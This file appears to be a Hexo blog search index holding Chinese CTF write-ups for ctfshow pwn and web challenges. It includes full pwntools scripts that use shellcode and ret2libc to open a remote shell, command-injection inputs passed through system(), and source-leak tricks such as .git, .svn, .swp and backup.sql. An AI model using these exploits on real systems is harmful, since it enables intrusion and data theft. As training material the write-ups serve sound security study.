<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>pwn13-19</title>
    <url>/2025/01/19/pwn13-19/</url>
    <content><![CDATA[<h1><em><strong>*pwn13*</strong></em></h1>
<p>如何使用GCC？编译运行后即可获得flag</p>
<p>题目说了gcc</p>
<p>gcc -o flag -flag.c</p>
<p>“-o flag” 表示将编译后的输出文件命名为 “flag”，“-flag.c” 表示要编译的源文件是 “flag.c”。这个指令的作用是使用 gcc 编译器将名为 “flag.c” 的源文件编译成可执行文件，并命名为 “flag”。</p>
<p>之后就编译出了一个flag的文件（无后缀），然后./flag就可以运行得到flag</p>
<h1><em><strong>*pwn14*</strong></em></h1>
<p>请你阅读以下源码，给定key为”CTFshow”，编译运行即可获得flag</p>
<p>Ida</p>
<p><img src="image-20250120034253588.png" alt="image-20250120034253588"></p>
<p>代码的大致逻辑就是读取一个名为&quot;key&quot;的文件，然后根据该文件的内容通过一个while循环再嵌套两个for循环</p>
<p>那一个名字为key的文件怎么搞？内容是什么？</p>
<p>Echo CTFshow &gt; key</p>
<p>Gcc -o flag -flag.c</p>
<p>./flag</p>
<p>拿到flag</p>
<h1><em><strong>*pwn15*</strong></em></h1>
<p>编译汇编代码到可执行文件，即可拿到flag</p>
<p>nasm -f elf64 flag.asm</p>
<p>Gcc -o flag -flag.o</p>
<p>./flag</p>
<p>拿到flag</p>
<h1><em><strong>*pwn16*</strong></em></h1>
<p>使用gcc将其编译为可执行文件</p>
<p>Gcc -o flag -flag.s</p>
<p>./flag</p>
<p>·</p>
<h1><em><strong>*pwn17*</strong></em></h1>
<p>有些命令好像有点不一样？</p>
<p>不要一直等，可能那样永远也等不到flag</p>
<p>Nc一下，四个选项</p>
<p><img src="wps2.jpg" alt="img"></p>
<p>3选项似乎能给出flag，但是要等好久，ida看看要等…114514秒，换算一下约等于31.8小时，ps：傻逼。后面还有system，而且在其他选项当中也有system，而在选项2当中有system，并且可以自行输入system的内容，这应该算是一种思路连接吧，最终得到答案。</p>
<p><img src="wps3.jpg" alt="img"></p>
<p>只有选项2可以用了，</p>
<p>read(0, buf, 0xAuLL);读取输入的9个字符串给buf</p>
<p>strcat(dest, buf);把buf赋值给dest</p>
<p>system(dest);以system输出dest(类似拼接)</p>
<p>那么我们要输入什么呢？而且还要是9个字符串!</p>
<p>原理上，只要不限制长度，cat /ctfshow_flag应该能拿到flag</p>
<p>但是有限制长度，</p>
<p>\1. 根据ctfpwn的考题分析，肯定要拿到shell的，所以，我们system里面要用/bin/sh，就可以</p>
<p>\2. 或者找到其他方法，让输入的字符小于等于9个字符串，用cat /ctf*就可以了</p>
<p>ctfshow{47387d02-8a66-493f-a931-5551b99a4786}</p>
<h1><em><strong>*pwn18*</strong></em></h1>
<p>仔细看看源码，或许有惊喜</p>
<p>假作真时真亦假，真作假时假亦真</p>
<p><img src="wps4.jpg" alt="img"></p>
<p><img src="wps5.jpg" alt="img"></p>
<p><img src="wps6.jpg" alt="img"></p>
<p>ida分析，有fake和real函数，分析得：</p>
<p>fake函数是在文本flag is here 后面跟着一个/ctfshow_flag</p>
<p>Real函数是把文本flag is here 更改为/ctfshow_flag(就是文本，不是指令)</p>
<p>&gt;&gt;</p>
<p>&gt;</p>
<p>综上，应该进行fake函数，并且一定不要运行real函数</p>
<p>Ida分析得，输入9就可以了</p>
<p>ctfshow{39868dcb-b2f7-49ac-83dd-24ea77e44393}</p>
<h1><em><strong>*pwn19*</strong></em></h1>
<p>关闭了输出流，一定是最安全的吗？</p>
<p><img src="wps7.jpg" alt="img"></p>
<p>这是ida看到的</p>
<p><img src="wps8.jpg" alt="img"></p>
<p>nc之后发现已经进入了else进程，应该是别人wp里面的子进程了吧</p>
<p>Fclose(_bss_start)关闭了输出流，就是你无法看到回显，就算你输入了，cat ctfshow_flag也是无法看到内容的</p>
<p>在每个代码后面加上&gt;&amp;0 即可看到回显</p>
<p><img src="wps9.jpg" alt="img"></p>
<p>大致意思应该就是把回显结果覆盖到终端后面或者键盘输入的后面</p>
<p>在之后就可以输入cat ctfshow_flag &gt;&amp;0 即可</p>
<p>最后提一点，我们每次nc进去都是在else里面,我们每次输入一个指令之后得重新nc，因为我们每次输入指令之后子进程就会结束并进入if当中。</p>
<p>ctfshow{478f3d3b-002f-461d-afaa-4ba72d92db9b}</p>
<h1>总结</h1>
<p>1.GCC即GNU 编译器套件（GNU Compiler Collection），将高级编程语言编写的代码转换为可执行机器码或其他目标形式的工具集合，支持多种语言。</p>
<p>2.NASM（Netwide Assembler）是一个基于 x86 架构的汇编语言编译器，用于将汇编语言代码转换为可执行文件或目标文件</p>
<p>3.&gt;&gt;追加，&gt;写入(覆盖)</p>
<p>4.关闭输出流，<code>&gt;&amp;0</code>的作用是将标准输出和标准错误输出都重定向到标准输入所对应的位置或设备</p>
<p><code>&amp;</code>在重定向中用于表示文件描述符。常见的文件描述符有<code>0</code>、<code>1</code>、<code>2</code>，其中<code>0</code>代表标准输入（stdin），<code>1</code>代表标准输出（stdout），<code>2</code>代表标准错误输出（stderr）</p>
<ol start="5">
<li></li>
</ol>
]]></content>
      <tags>
        <tag>ctfshow_pwn_前置基础</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn20-</title>
    <url>/2025/01/21/pwn20/</url>
    <content><![CDATA[<h1>pwn20、21、22</h1>
<p><a href="https://blog.csdn.net/linyt/article/details/51635768">https://blog.csdn.net/linyt/article/details/51635768</a></p>
<p><a href="https://linyt.blog.csdn.net/article/details/51636753">https://linyt.blog.csdn.net/article/details/51636753</a></p>
<p><a href="https://linyt.blog.csdn.net/article/details/51637832">https://linyt.blog.csdn.net/article/details/51637832</a></p>
<p>.got和.got.plt是否可写</p>
<p>checksec当中的RELRO与此有关，</p>
<p><img src="wps2.jpg" alt="img"></p>
<table>
<thead>
<tr>
<th>当RELRO为Partial RELRO时，表示.got不可写而.got.plt可写。</th>
</tr>
</thead>
<tbody>
<tr>
<td>当RELRO为FullRELRO时，表示.got不可写.got.plt也不可写。</td>
</tr>
<tr>
<td>当RELRO为No RELRO时，表示.got与.got.plt都可写。</td>
</tr>
</tbody>
</table>
<p>根据checksec得知flag的前半部分</p>
<table>
<thead>
<tr>
<th>20:1 1</th>
</tr>
</thead>
<tbody>
<tr>
<td>21:0 1</td>
</tr>
<tr>
<td>22:0 0</td>
</tr>
</tbody>
</table>
<p>Readelf -S pwn找到flag后半部分</p>
<table>
<thead>
<tr>
<th>20:0x600f18、0x600f28</th>
</tr>
</thead>
<tbody>
<tr>
<td>21:0x600ff0_0x601000</td>
</tr>
<tr>
<td>22:0x600fc0</td>
</tr>
</tbody>
</table>
<p>按题目要求拼接flag即可</p>
<h1>pwn23</h1>
<p>我觉得这道题不应该出现在这里，或者出现在这里就是让大家了解一下栈溢出</p>
<p>连接之后可以直接进行操作，…/ls</p>
<p>发现ctfshow_flag可以直接cat，但是这里不行</p>
<p>file和checksec一下，32，进去ida跟进ctfshow，发现strcpy函数，此函数不会限制大小，但其里面有dest上方限制了大小为58，可以栈溢出(0x3Eh+0x4)</p>
<p>至于为什么栈溢出之后会出现flag：</p>
<p>ida上面还有一段代码  signal(11, (__sighandler_t)sigsegv_handler);</p>
<p><img src="wps3.jpg" alt="img"></p>
<p>简单来说就是我们利用了栈溢出，这段代码检测出了我们这种非法行为，然后就运行sigsegv_handler这个函数，而这个函数正好可以打印出来flag</p>
<p><img src="wps4.jpg" alt="img"></p>
<p>这个内容在pwn35当中还会出现</p>
<h1>pwn24</h1>
<p>题目提示：你可以使用pwntools的shellcraft模块来进行攻击</p>
<p>这道题大致应该是让我们认识一下shell和exp</p>
<p>先解释一下shell：相当于我们windows上面的cmd</p>
<p>exp是我们利用程序漏洞，编写出的可以拿到服务端的shell的代码</p>
<p>例如本题拿到shell的exp：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import * //引入pwn库</span><br><span class="line"></span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;, &quot;28155&quot;) //远程连接xxx的xxx端口</span><br><span class="line"></span><br><span class="line">shell = asm(shellcraft.sh()) //创建shellcraft模块进行连接</span><br><span class="line"></span><br><span class="line">p.sendline(shell) //将shell发送给服务端</span><br><span class="line"></span><br><span class="line">p.interactive() //与服务端进行交互（cat flag......）</span><br></pre></td></tr></table></figure>
<p>其他作者的wp里面没有说明为什么写一个shell就可以拿到flag，但有一个作者提到了ret2text题型，之后可以看一下</p>
<p>ctfshow{82d73717-57b0-4b24-a66b-4d916886d6b3}</p>
<h1>pwn25</h1>
<p>ret2libc</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="string">&quot;28111&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x88</span> + <span class="number">0x4</span></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = offset * <span class="string">b&#x27;a&#x27;</span> + p32(puts_plt) + p32(main_addr) + p32(puts_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将输出的puts的地址赋给puts_addr</span></span><br><span class="line">puts_addr = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"><span class="comment"># 中间填充4个a是为了使栈上的数据对齐，直接写 /bin/sh 的地址是可以的，但这样做可能导致栈上的数据错乱，影响函数参数的正确传递。</span></span><br><span class="line">payload = offset * <span class="string">b&#x27;a&#x27;</span> + p32(system_addr) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span> + p32(binsh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>总结的来说，就是利用两次公式和一个可用的函数，payload两次。在后一个payload通过sys和binsh的拼接拿到shell。在前一个payload我们需要通过程序本身来拿到可用的函数puts的真实地址，然后通过此地址计算出sys的地址和binsh字符串的地址。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">公式：</span><br><span class="line">	正着理解：puts的地址=libc当中puts的地址+libc的基地址（puts函数调用就是这样的）</span><br><span class="line">    思想滑坡：libc的基地址=puts的地址-libc当中puts的地址</span><br></pre></td></tr></table></figure>
<h1>pwn26</h1>
<p>什么是ASLR?<br>
大多数的攻击都基于这样一个前提，即攻击者知道程序的内存布局，需要提前知道shellcode或者其他一些数据的位置。因此，引入内存布局的随机化能够有效增加漏洞利用的难度，其中一种技术就是ASLR（Address Space Layout Randomization）。ASLR提供的只是概率上的安全性，根据用于随机化的熵，攻击者有可能幸运地猜到正确的地址，有时攻击者还可以爆破。</p>
<p>在Linux上，ASLR的全局配置/proc/sts/kernel/randomize_va_space有三种情况：0表示关闭ASLR；1表示部分开启（将mmap的基址，stack和vdso页面随机化）；2表示完全开启（在部分开启的基础上增加heap的随机化）。如下：</p>
<p><img src="dca1d09a503d59cfce1fcec2afad6776.png" alt="在这里插入图片描述"></p>
<p>我们可以修改/proc/sts/kernel/randomize_va_space文件的值来配置ASLR。</p>
<p><img src="image-20250120195919434.png" alt="image-20250120195919434"></p>
<p>大致意思：查看我们的ASLR，如果内容为0则给出正确的flag，如果不是0，则给出错误的flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">su root</span><br><span class="line">echo <span class="number">0</span> &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">./pwn</span><br></pre></td></tr></table></figure>
<p>ctfshow{0x400687_0x400560_0x6032a0_0x7ffff7fbb6b0}</p>
<h1>pwn27</h1>
<p><img src="image-20250120200224239.png" alt="image-20250120200224239"></p>
<p>大致意思和pwn26差不多，只是ASLR变成了1或者0都可以</p>
<h1>pwn28</h1>
<p>什么限制都没有，直接给flag了</p>
<h1>pwn29</h1>
<p>他就是让我们知道ASLR的作用(随机地址)，然后flag又直接给我们了</p>
<p>在启用 ASLR（Address Space Layout Randomization）和 PIE（Position Independent Executable）后，系统会随机化内存布局，但是随机化的仅仅是对象的起始地址，而不会随机化对象内部的结构和相对偏移</p>
<h1>pwn30</h1>
<p>方法和pwn25相同，可以拿来练习一下</p>
<p>ctfshow{937ddff1-75d3-40ed-8607-54bfd164b92d}</p>
<h1>pwn31</h1>
<p>各种wp都说对新手不太友好</p>
<p>但是我们要勇于挑战自己</p>
<p>做完了，其实奥，其实，就是pwn25加了一点别的</p>
<p>这里需要补充知识：</p>
<p>打开ASLR的时候需要用绝对地址，而我们在pwn25当中使用的是相对地址</p>
<p>如果ASLR没有打开的时候，使用绝对地址也是可以的</p>
<table>
<thead>
<tr>
<th>绝对地址：表示程序加载到内存后，符号（如函数）在内存中的实际位置。它是在程序执行时才能确定的。</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>相对地址（如 <code>elf.plt['puts']</code>）</strong>：它是静态的，通常在程序编译时确定，表示函数在 ELF 文件中的偏移位置。</td>
</tr>
<tr>
<td>真实地址：ASLR打开之后地址会改变，改变之后的地址就是真实地址</td>
</tr>
<tr>
<td>总的来说：绝对地址就像是在文件当中的地址；相对地址就像是程序运行时在内存当中的地址</td>
</tr>
</tbody>
</table>
<p>写exp的思路：1.泄露puts地址。2.计算libc基地址。3.获取sys和binsh的地址。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="number">28151</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">main_real_addr = <span class="built_in">int</span>(p.recv().strip(),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_real_addr))</span><br><span class="line">base_addr = main_real_addr - elf.sym[<span class="string">&#x27;main&#x27;</span>] </span><br><span class="line"><span class="comment"># sym 是 ELF 对象的一个属性，它是一个字典，包含了 ELF 文件中所有符号表项的名称与对应地址。这里是指返回main函数的地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 由于ASLR打开了，所以，这里需要用到绝对地址</span></span><br><span class="line">puts_plt = base_addr + elf.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = base_addr + elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">ctfshow_addr = base_addr +elf.sym[<span class="string">&#x27;ctfshow&#x27;</span>]</span><br><span class="line"><span class="comment"># 0x1fc0是.got的真实地址。这里的作用是将寄存器恢复原状，原因是在此程序当中，后续还需要寄存器ebx,如果不恢复，这个程序将会“崩溃”</span></span><br><span class="line">ebx = base_addr + <span class="number">0x1fc0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#总共需要140个才可以溢出，但是，有大佬说133-136位其实在两题的代码中一直都有特殊意义。为什么是133-136位？你怎么知道是133-136位的？</span></span><br><span class="line">payload = <span class="number">132</span> * <span class="string">b&#x27;a&#x27;</span> + p32(ebx) + <span class="number">4</span> * <span class="string">b&#x27;a&#x27;</span> +p32(puts_plt) + p32(main_real_addr) +p32(puts_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">puts_addr = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line">payload = <span class="number">140</span> * <span class="string">b&#x27;a&#x27;</span> +p32(system_addr) +p32(ctfshow_addr) + p32(binsh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>ctfshow{b53d77c9-84f9-4bf3-87ae-17bbca44b4c7}</p>
<h1>总结</h1>
<p>1.当checksec查看RELRO时</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RELRO为Partial RELRO时，表示.got不可写而.got.plt可写。</span><br><span class="line"></span><br><span class="line">RELRO为FullRELRO时，表示.got不可写.got.plt也不可写。</span><br><span class="line"></span><br><span class="line">RELRO为No RELRO时，表示.got与.got.plt都可写。</span><br></pre></td></tr></table></figure>
<p>2.signal(11, (__sighandler_t)sigsegv_handler);这段代码会检测我们利用栈溢出，一旦溢出，会运行其中的sigsegv_handler函数</p>
<p>3.shell：相当于我们windows上面的cmd</p>
<p>4.exp是我们利用程序漏洞，编写出的可以拿到服务端的shell的代码</p>
<p>熬穿了，睡觉了，知识点明天再补</p>
]]></content>
      <tags>
        <tag>ctfshow_pwn_前置基础</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn6-12</title>
    <url>/2025/01/19/pwn6-12/</url>
    <content><![CDATA[<h2 id="前置基础">前置基础</h2>
<h3 id="pwn6-pwn12知识点">pwn6-pwn12知识点</h3>
<p>数据的寻址方式:</p>
<p>​	1 指令和数据的寻址方式</p>
<p>​	2 数据寻址方式说明</p>
<p>​	3 立即寻址</p>
<p>​	4 直接寻址</p>
<p>​	5 （存储器）间接寻址</p>
<p>​	6 寄存器寻址</p>
<p>​	7 寄存器间接寻址</p>
<p>​	8 相对地址</p>
<p>​	9 相对基址寻址</p>
<p>​	10 相对变址寻址</p>
<p>​	11 相对基址变址寻址</p>
<p><strong>寄存器间接寻址</strong></p>
<p><strong>格式：[寄存器]</strong></p>
<p>说明：指令中指定一个寄存器，该寄存器中存放的是操作数的有效地址，通过访问该寄存器所指向的内存单元来获取操作数。例如在 8086 汇编语言中，MOV AX,[BX]，这里BX寄存器中存放的是一个内存地址，将该地址中的数据传送到AX寄存器中。</p>
<p><strong>基址寻址</strong></p>
<p><strong>格式：[基址寄存器 + 位移量]</strong></p>
<p>说明：以一个基址寄存器的内容为基准地址，再加上一个位移量来形成操作数的有效地址。如MOV AX,[BX + 10H]，BX是基址寄存器，10H是位移量，将BX寄存器中的值加上10H得到的地址中的数据传送到AX寄存器。</p>
<p><strong>变址寻址</strong></p>
<p><strong>格式：[变址寄存器 + 位移量]</strong></p>
<p>说明：与基址寻址类似，但使用变址寄存器来提供地址偏移量。例如MOV AX,[SI + 20H]，SI是变址寄存器，20H是位移量，把SI寄存器中的值加上20H所指向的内存单元中的数据传送到AX寄存器。</p>
<p><strong>基址变址寻址</strong></p>
<p><strong>格式：[基址寄存器 + 变址寄存器] 或 [基址寄存器 + 变址寄存器 + 位移量]</strong></p>
<p>说明：将基址寄存器和变址寄存器的内容相加，再加上可选的位移量来形成操作数的有效地址。例如在 8086 中MOV AX,[BX + SI] 或者MOV AX,[BX + SI + 30H]，通过这种方式可以更灵活地访问二维数组等数据结构。</p>
<p><strong>相对寻址</strong></p>
<p><strong>格式：[程序计数器 (PC) + 位移量]</strong></p>
<p>说明：以程序计数器当前的值为基准，加上一个位移量来形成转移目标地址。常用于程序的分支跳转指令，如JMP 10H[PC]，表示跳转到当前程序计数器的值加上10H后的地址处继续执行程序。</p>
<p><strong>间接间接寻址</strong></p>
<p><strong>格式：[[寄存器]]</strong></p>
<p>说明：先访问指令中指定的寄存器，该寄存器中存放的是另一个内存单元的地址，再通过这个地址去访问最终的操作数。例如MOV AX,[[BX]]，先取BX寄存器中的值作为一个地址，再取该地址中的值作为最终操作数的地址，将该最终地址中的数据传送到AX寄存器。</p>
<h3 id="pwn5">pwn5</h3>
<p>题目信息：立即寻址方式结束后eax寄存器的值为？</p>
<p><img src="image-20250113120703387.png" alt="image-20250113120703387"></p>
<p>打开之后，没错，就是这个界面，刚开始的时候我以为这是我ida开错了</p>
<img src="image-20250113120727880.png" alt="image-20250113120727880">
<p>eax\ebx\ecx\edx都在这里</p>
<p>我们需要eax</p>
<p><img src="image-20250113120828151.png" alt="image-20250113120828151"></p>
<p>mov是移动的意思，这里指eax=0Bh（h是十进制的意思）</p>
<p>Add就是加的意思eax+=1BF48h</p>
<p>sub是subtract（减）的缩写</p>
<p>所以最终的eax=B+BF48-1=114514</p>
<p>Ctfshow{114514}</p>
<h3 id="pwn7">pwn7</h3>
<p>题目信息:寄存器寻址方式结束后edx寄存器的值为？</p>
<p><img src="image-20250113121038920.png" alt="image-20250113121038920"></p>
<p>Ebx=36D</p>
<p>Edx=ebx</p>
<p>综上edx=36D</p>
<p>注意大小写</p>
<h3 id="pwn8">pwn8</h3>
<p>题目信息:直接寻址方式结束后ecx寄存器的值为？</p>
<p><img src="image-20250113121123869.png" alt="image-20250113121123869"></p>
<p>Ecx=dword_80490E8</p>
<p>dword_80490E8的地址是0x80490E8(双击跟进dword_80490E8)</p>
<p><img src="wps1.jpg" alt="img"></p>
<p>也就说把dword_80490E8的地址0x80490E8赋值给了ecx</p>
<p>{0x80490E8}</p>
<h3 id="pwn9">pwn9</h3>
<p>题目信息:寄存器间接寻址方式结束后eax寄存器的值为？</p>
<p><img src="wps2.jpg" alt="img"></p>
<p>括号[]的意思是将esi所指向的地址的值赋值给eax</p>
<p>Esi, offset dword_80490E8的意思是将msg(massage,这里是指dword_8090E8)的地址赋值给esi</p>
<p>那么值为什么呢？双击！跟进</p>
<p><img src="wps3.jpg" alt="img"></p>
<p>{0x636C6557}</p>
<h3 id="pwn10">pwn10</h3>
<p>题目信息:寄存器相对寻址方式结束后eax寄存器的值为？</p>
<p><img src="wps4.jpg" alt="img"></p>
<p>最终eax=[0x80490E8+4]=[0x80490EC]=ome_to_CTFshow_PWN</p>
<p><img src="wps5.jpg" alt="img"></p>
<h3 id="pwn11">pwn11</h3>
<p>题目信息:基址变址寻址方式结束后的eax寄存器的值为？</p>
<p>基址变址寻址方式结束后的eax寄存器的值为？</p>
<p><img src="wps6.jpg" alt="img"></p>
<p>Eax=[0x80490E8+2*2]=[80490EC]=ome_to_CTFshow_PWN</p>
<h3 id="pwn12">pwn12</h3>
<p>相对基址变址寻址方式结束后eax寄存器的值为？</p>
<p><img src="wps7.jpg" alt="img"></p>
<p>Eax=[0x80490E8+1+8*2-6]=[80490EC]=ome_to_CTFshow_PWN</p>
]]></content>
      <tags>
        <tag>ctfshow_pwn_前置基础</tag>
      </tags>
  </entry>
  <entry>
    <title>web1-10</title>
    <url>/2025/01/19/web1-10/</url>
    <content><![CDATA[<h1>Web1:</h1>
<p><img src="wps1.jpg" alt="img"></p>
<p>直接f12。看到flag</p>
<p>ctfshow{941628a1-7381-4612-9c0f-201bede5949c}</p>
<h1>Web2:</h1>
<p><img src="wps2.jpg" alt="img"></p>
<p>看不了源码（右键不管用、f12不管用）</p>
<p>法一：不怕抓包</p>
<p>法二：firefox浏览器直接ctrl+u看源码</p>
<p>ctfshow{836f5d1a-952d-41fb-a059-748adf37147</p>
<h1>Web3:</h1>
<p><img src="wps3.jpg" alt="img"></p>
<p>啥都没有，bp抓包</p>
<p>ctfshow{f40cb561-9170-4abf-96b5-422812ef996f}</p>
<h1>Web4:</h1>
<p>bp抓包</p>
<p>没思路，看题目提示：总有人把后台地址写入robots，帮黑阔大佬们引路。</p>
<p>Robots:即robots.txt。这个文件可能会泄露部分网站目录</p>
<p>在url后面添加/robots.txt</p>
<p><img src="wps4.jpg" alt="img"></p>
<p>复制/flagishere.txt，替换url后面的robots.txt</p>
<p>进去</p>
<p>ctfshow{5e980d7b-1652-4fd2-aa6f-fb9ce4e92f8d}</p>
<h1>Web5</h1>
<p>Bp抓包无果，查看提示：phps源码泄露有时候能帮上忙</p>
<p>这道题是php源码泄露，查看响应头，</p>
<p><img src="wps5.jpg" alt="img"></p>
<p>X-Powered-Bys后面是php及其版本。</p>
<p>php的主页文件是index.php</p>
<p>访问index.php发现还是原来的界面</p>
<p>然后在后面加一个s可以下载一个文件</p>
<p>ctfshow{fb1c7fe7-f1d8-47de-be54-2a32756be6c8}</p>
<h1>Web6</h1>
<p>看提示:解压源码到当前目录，测试正常，收工</p>
<p>网站主页源码文件名称为www.zip，然后再url后添加/www.zip对网站主页源码进行下载,然后进行解压</p>
<p><img src="wps6.jpg" alt="img"></p>
<p>ctfshow{83099411-6ed3-4ec1-9336-8fe1d68f5bad}</p>
<h1>Web7:</h1>
<p>提示:版本控制很重要，但不要部署到生产环境更重要。</p>
<p>git代码泄露，直接访问/.git即可</p>
<p>在Linux当中.开头的文件为隐藏文件,网站管理员可能会存在在没有删除.git隐藏文件的情况下就将网站上线，这样就会造成源码泄露</p>
<p>ctfshow{3caad85e-71c8-4867-9a13-a6cc8a85c4ff}</p>
<h1>Web8:</h1>
<p>提示:版本控制很重要，但不要部署到生产环境更重要。</p>
<p>svn泄露,直接访问/.svn即可</p>
<p>在Linux当中.开头的文件为隐藏文件,网站管理员可能会存在在没有删除.svn隐藏文件的情况下就将网站上线，这样就会造成源码泄露</p>
<p>ctfshow{2c8a2ed9-20cd-4c41-b0a6-42a3801bf904}</p>
<h1>Web9</h1>
<p>提示:发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了</p>
<p>vim缓存信息泄露，直接访问/index.php.swp即可</p>
<p>ctfshow{6b667116-0c5a-4fca-b6ad-f589fc29fb9f}</p>
<h1>Web10</h1>
<p>提示:cookie 只是一块饼干，不能存放任何隐私数据</p>
<p><img src="wps7.jpg" alt="img"></p>
<p>ctfshow{f7c26679-f08a-40c9-aff2-6a373d3a17c8}</p>
<h1><em><strong>1–10总结</strong></em></h1>
<p>1.无法查看源码？Firefox当中ctrl+u查看|bp|设置当中点出来</p>
<p>/robots.txt会泄露部分网站目录</p>
<p>2.php源码泄露：X-Powered-Bys后面是php及其版本。php的主页文件是index.php。然后在后面加一个s可以下载一个文件</p>
<p>3.网站主页源码文件名称为www.zip。/www.zip对网站主页源码进行下载,然后进行解压。本地看过之后在url进行操作</p>
<p>4.在Linux当中.开头的文件为隐藏文件,网站管理员可能会存在在没有删除.svn或者.git隐藏文件的情况下就将网站上线，这样就会造成源码泄露</p>
<p>5.vim缓存信息泄露，/index.php.swp</p>
]]></content>
      <tags>
        <tag>ctfshow_web_命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>web12-20</title>
    <url>/2025/01/19/web12-20/</url>
    <content><![CDATA[<h1>Web12</h1>
<p>提示:有时候网站上的公开信息，就是管理员常用密码</p>
<p>主要考察收集信息和大胆猜测的能力</p>
<p>Robots.txt</p>
<p>/admin/</p>
<p>User:admin</p>
<p>Passwd:372619038(在页面的最下面)</p>
<p>ctfshow{5fae3c78-7d0c-4749-ba24-fa0a6bbe9cdd}</p>
<h1>Web13</h1>
<p>提示;技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码</p>
<p>页面下面的document点进去出现账号密码和url</p>
<p>ctfshow{eb6944f6-439f-40a9-bdb2-1b15750377d8}</p>
<h1>Web14</h1>
<p>提示:有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人</p>
<p>我们看源码，搜索editor发现是一个图片，再通过wp进入了editor</p>
<p>联想到：页面的设计编辑当中出现的图片是通过一个画图工具显示的，那么这个画图工具一定可以查看当前所有目录。</p>
<p>那么，我们就把flag所在的目录搞到url就可以</p>
<p>Wp说的原理</p>
<p><img src="wps8.jpg" alt="img"></p>
<h1>Web15</h1>
<p>提示：公开的信息比如邮箱，可能造成信息泄露，产生严重后果</p>
<p>这道题我们可以通过utl/admin进入后台，然后账号应该是admin，密码不知道，但是重置密码里面可以重置，但是要重置密码需要作者所居住的城市，我们可以通过页面下面作者的qq邮箱搜索他的qq（25.1.16截至今天已经搜不到了），不过不妨碍做题，是西安，密码重置了之后登录进去</p>
<p>ctfshow{d95e4ba6-fa90-40ee-9835-f68407fb8f9b}</p>
<h1>Web16</h1>
<p>提示：对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</p>
<p>PHP探针：php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。输入URL/tz.php 即可打开雅黑PHP探针</p>
<p><img src="wps9.jpg" alt="img"></p>
<p>点进phpinfo，查看php信息，然后搜索ctf</p>
<p>ctfshow{1b1ba394-e6ac-40fa-a0a2-aec94f57f917}</p>
<h1>Web17</h1>
<p>提示：备份的sql文件会泄露敏感信息</p>
<p>Url/backup.sql</p>
